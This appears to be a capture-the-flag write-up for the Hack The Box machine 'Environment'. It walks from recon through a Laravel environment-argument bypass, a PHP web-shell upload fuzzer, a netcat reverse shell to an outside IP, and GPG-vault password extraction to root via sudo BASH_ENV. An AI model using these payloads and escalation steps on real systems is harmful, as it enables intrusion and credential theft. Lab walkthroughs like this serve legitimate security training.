# Environment

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.67:22
Open 10.10.11.67:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.67

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open  http    syn-ack nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

Nothing on the main page, Laravel is serving the application so there should be more.

![Writeup.png](/assets/pentest/htb/environment/Writeup.png)

Send Mail doesn't seem like a placeholder
```js
document.getElementById('mailingListForm').addEventListener('submit', async function (event) {
	event.preventDefault(); // Prevent the default form submission behavior

	const email = document.getElementById('email').value;
	const csrfToken = document.getElementsByName("_token")[0].value;
	const responseMessage = document.getElementById('responseMessage');

	try {
		const response = await fetch('/mailing', {
			method: 'POST',
			headers: { 'Content-Type': 'application/x-www-form-urlencoded', },
			body: "email=" + email + "&_token=" + csrfToken,
		});

		if (response.ok) {
			const data = await response.json();
			responseMessage.textContent = data.message; // Display success message
			responseMessage.style.color = 'greenyellow';
		} else {
			const errorData = await response.json();
			responseMessage.textContent = errorData.message || 'An error occurred.';
			responseMessage.style.color = 'red';
		}
	} catch (error) {
		responseMessage.textContent = 'Failed to send the request.';
		responseMessage.style.color = 'red';
	}
});
```

Most of the access to paths are denied.
```bash
└─$ feroxbuster -u http://environment.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -n -D -C 404,403,400 -S 0,34,28036
200      GET        1l       27w     1713c http://environment.htb/build/assets/styles-Bl2K3jyg.css
405      GET     2575l     8675w   244841c http://environment.htb/mailing
200      GET       87l      392w     4602c http://environment.htb/
301      GET        7l       11w      169c http://environment.htb/build => http://environment.htb/build/
200      GET       87l      392w     4602c http://environment.htb/index.php
200      GET        1l      119w     4111c http://environment.htb/build/assets/login-CnECh1Us.css
302      GET       12l       22w      358c http://environment.htb/logout => http://environment.htb/login
200      GET       54l      174w     2391c http://environment.htb/login
200      GET        2l        3w       24c http://environment.htb/robots.txt
301      GET        7l       11w      169c http://environment.htb/storage => http://environment.htb/storage/
200      GET       50l      135w     2127c http://environment.htb/up
301      GET        7l       11w      169c http://environment.htb/vendor => http://environment.htb/vendor/
405      GET     2575l     8675w   244839c http://environment.htb/upload
[####################] - 4m     11139/11139   0s      found:13      errors:3
[####################] - 4m     11052/11052   49/s    http://environment.htb/ 
```

### Debug=True

Debug seems to be enabled?

![Writeup-1.png](/assets/pentest/htb/environment/Writeup-1.png)

Sending malformed requests reveals stack trace. For `login` there seems to be hidden environment value which grants admin access automatically.

![Writeup-2.png](/assets/pentest/htb/environment/Writeup-2.png)

### Env Poisoning

[snyk laravel/framework vulnerabilities](https://security.snyk.io/package/composer/laravel%2Fframework) -> [Arbitrary Argument Injection](https://security.snyk.io/vuln/SNYK-PHP-LARAVELFRAMEWORK-8367200) -> [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301)

Catch and modify the legal request, adding `?--env=preprod` in url params grants access to developer backdoor.

![Writeup-3.png](/assets/pentest/htb/environment/Writeup-3.png)

![Writeup-4.png](/assets/pentest/htb/environment/Writeup-4.png)

### File upload

Fuzz the extensions
```python
from requests import Session
from bs4 import BeautifulSoup as BS
from random import randbytes

URL = 'http://environment.htb'

def get_csrf(session, url):
    return BS(session.get(url).text, 'html.parser').find('input', {'name': '_token'})['value']

with Session() as session:
    # Auth
    url = f'{URL}/login'
    token = get_csrf(session, url)
    resp = session.post(
        url,
        params={'--env': 'preprod'},
        data={'email': 'x@y.z', 'password': 'letmein', 'remember': True, '_token': token}
    )

    # └─$ cat /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt | grep php -i > php.txt
    # └─$ echo 'GIF89;<?php system($_REQUEST[0]) ?>' > payload.php
    with open('./php.txt') as f, open('payload.php') as payload:
        # Fuzz extension
        for line in f:
            payload.seek(0)
            extension = line.strip()
            token = get_csrf(session, f'{URL}/management/profile')
            resp = session.post(
                f'{URL}/upload',
                data={'_token': token},
                files = { 'upload': (f'{randbytes(16).hex()}{extension}', payload, 'image/gif') },
                # proxies={'http': 'http://127.0.0.1:8080'}
            ).json()
            if 'error' in resp:
                print(f'[-] Extension {extension} failed: {resp["error"]}')
            else:
                print(f'[+] Extension {extension} worked: {resp["url"]}')
                if 'pwned' in session.get(resp['url'], params={0: 'echo pwned'}).text:
                    print(f'[!] Code exec successful with {extension}')
        
            print('-' * 32)
```

```bash
[-] Extension .login.php failed: {'message': 'Invalid file detected'}
--------------------------------
[+] Extension .php. worked: http://environment.htb/storage/files/791ccaac49913712fa84c10e362f1633.php
[+] Code exec successful with .php.
--------------------------------
[-] Extension .preview-content.php failed: {'message': 'Invalid file detected'}
--------------------------------
[-] Extension .old.php failed: {'message': 'Invalid file detected'}
--------------------------------
```

## Reverse Shell (www-data)

Get reverse shell
```bash
└─$ curl 'http://environment.htb/storage/files/a8c49e3b3d715692ff66235438d08051.php' --data-urlencode '0=busybox nc 10.10.14.18 4444 -e /bin/bash'
```

```bash
script /dev/null -qc /bin/bash
www-data@environment:~/app/storage/app/public/files$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Database

Hashes look like SHA512 which is most likely not crackable..

```bash
www-data@environment:~/app/database$ sqlite3 database.sqlite '.tables'
cache                  jobs                   sessions
cache_locks            mailing_list           users
failed_jobs            migrations
job_batches            password_reset_tokens
www-data@environment:~/app/database$ sqlite3 database.sqlite '.mode column' 'SELECT * FROM users'
id  name     email                    email_verified_at  password                                                      remember_token  created_at           updated_at           profile_picture
--  -------  -----------------------  -----------------  ------------------------------------------------------------  --------------  -------------------  -------------------  ---------------
1   Hish     hish@environment.htb                        $2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi                  2025-01-07 01:51:54  2025-01-12 01:01:48  hish.png
2   Jono     jono@environment.htb                        $2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm                  2025-01-07 01:52:35  2025-01-07 01:52:35  jono.png
3   Bethany  bethany@environment.htb                     $2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.                  2025-01-07 01:53:18  2025-01-07 01:53:18  bethany.png
```

### User.txt

User flag is readable by all, as well as `hish` directory by other users.
```bash
www-data@environment:/home/hish$ ls -alh
total 36K
drwxr-xr-x 5 hish hish 4.0K Apr 11 00:51 .
drwxr-xr-x 3 root root 4.0K Jan 12 11:51 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6 21:28 .bash_logout
-rw-r--r-- 1 hish hish 3.5K Jan 12 14:42 .bashrc
drwxr-xr-x 4 hish hish 4.0K Jul  2 20:01 .gnupg
drwxr-xr-x 3 hish hish 4.0K Jan  6 21:43 .local
-rw-r--r-- 1 hish hish  807 Jan  6 21:28 .profile
drwxr-xr-x 2 hish hish 4.0K Jan 12 11:49 backup
-rw-r--r-- 1 root hish   33 Jul  2 14:02 user.txt
www-data@environment:/home/hish$ cat user.txt
611a7ebfea8f0f1385cc284c92c3982b
```

## Privilege Escalation (hish)

### GPG

There are a lot of GPG files which we have access to.
```bash
www-data@environment:/home/hish$ find -ls
   130585      4 drwxr-xr-x   5 hish     hish         4096 Apr 11 00:51 .
   136656      4 drwxr-xr-x   2 hish     hish         4096 Jan 12 11:49 ./backup
   136664      4 -rw-r--r--   1 hish     hish          430 Jul  2 20:02 ./backup/keyvault.gpg
   136658      4 -rw-r--r--   1 root     hish           33 Jul  2 14:02 ./user.txt
   130562      0 lrwxrwxrwx   1 root     root            9 Apr  7 19:29 ./.bash_history -> /dev/null
   130586      4 -rw-r--r--   1 hish     hish          220 Jan  6 21:28 ./.bash_logout
   136670      4 drwxr-xr-x   3 hish     hish         4096 Jan  6 21:43 ./.local
   136671      4 drwxr-xr-x   5 hish     hish         4096 Jan 12 10:23 ./.local/share
   156043      4 drwxr-xr-x   3 hish     hish         4096 Jan 12 11:46 ./.local/share/caddy
   156048      4 drwxr-xr-x   2 hish     hish         4096 Jan 12 11:46 ./.local/share/caddy/locks
   156049      4 -rw-r--r--   1 hish     hish           98 Jan 12 10:23 ./.local/share/caddy/locks/storage_clean.lock
   156047      4 -rw-r--r--   1 hish     hish           36 Jan 12 10:23 ./.local/share/caddy/instance.uuid
   136968      4 drwxr-xr-x   2 hish     hish         4096 Jan 12 11:45 ./.local/share/nano
   155848      4 -rw-r--r--   1 hish     hish            2 Jan 12 11:45 ./.local/share/nano/search_history
   136672      4 drwxr-xr-x   2 hish     hish         4096 Jan 12 11:46 ./.local/share/composer
   136673      4 -rw-r--r--   1 hish     hish           13 Jan  6 21:43 ./.local/share/composer/.htaccess
   155954      4 drwxr-xr-x   4 hish     hish         4096 Jul  2 20:02 ./.gnupg
   156021      4 drwxr-xr-x   2 hish     hish         4096 Jul  2 20:02 ./.gnupg/private-keys-v1.d
   130563      4 -rwxr-xr-x   1 hish     hish         1945 Jan 12 03:13 ./.gnupg/private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key
   130567      4 -rwxr-xr-x   1 hish     hish         1945 Jan 12 03:13 ./.gnupg/private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key
   130568      4 -rwxr-xr-x   1 hish     hish         1280 Jan 12 11:48 ./.gnupg/trustdb.gpg
   130569      4 -rwxr-xr-x   1 hish     hish         1446 Jan 12 03:13 ./.gnupg/pubring.kbx
   156026      4 drwxr-xr-x   2 hish     hish         4096 Jul  2 20:02 ./.gnupg/openpgp-revocs.d
   130570      4 -rwxr-xr-x   1 hish     hish         1436 Jan 12 03:13 ./.gnupg/openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev
   130571      4 -rwxr-xr-x   1 hish     hish           32 Jan 12 03:11 ./.gnupg/pubring.kbx~
   130572      4 -rwxr-xr-x   1 hish     hish          600 Jan 12 11:48 ./.gnupg/random_seed
   130587      4 -rw-r--r--   1 hish     hish          807 Jan  6 21:28 ./.profile
   130588      4 -rw-r--r--   1 hish     hish         3526 Jan 12 14:42 ./.bashrc
```

By default we can't create GPG directory, but we can override it.
```bash
(remote) www-data@environment:/tmp/my_gpg$ gpg --decrypt /home/hish/backup/keyvault.gpg
gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied
```

```bash
(remote) www-data@environment:/tmp$ rm -rf my_gpg/
(remote) www-data@environment:/tmp$ GPG_HOME=/tmp/my_gpg
(remote) www-data@environment:/tmp$ cp /home/hish/.gnupg/ $GPG_HOME -r
(remote) www-data@environment:/tmp$ chmod 700 $GPG_HOME
(remote) www-data@environment:/tmp$ cd $GPG_HOME
(remote) www-data@environment:/tmp/my_gpg$ gpg --homedir $GPG_HOME --decrypt /home/hish/backup/keyvault.gpg
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

```bash
(remote) www-data@environment:/tmp/my_gpg$ su - hish
Password: marineSPm@ster!!
hish@environment:~$ id
uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```
 
::: tip :bulb: Creds
`hish:marineSPm@ster!!`
:::


## Privilege Escalation (root)

`env_keep` is sometimes dangerous on `sudo`:
```bash
hish@environment:~$ sudo -l
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo

hish@environment:~$ cat /usr/bin/systeminfo
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

[https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)

```bash
hish@environment:~$ echo $'#!/bin/bash\ninstall /bin/bash /tmp/rootbash -m4777' | tee letmein.sh
#!/bin/bash
install /bin/bash /tmp/rootbash -m4777
hish@environment:~$ chmod 777 /tmp/letmein.sh
hish@environment:~$ sudo BASH_ENV=/tmp/letmein.sh systeminfo >/dev/null
hish@environment:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(hish) gid=1000(hish) euid=0(root) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

### Root.txt

```
rootbash-5.2# cat /root/root.txt
9e5e0ddd4172edbbb3eba2079ae031f4
```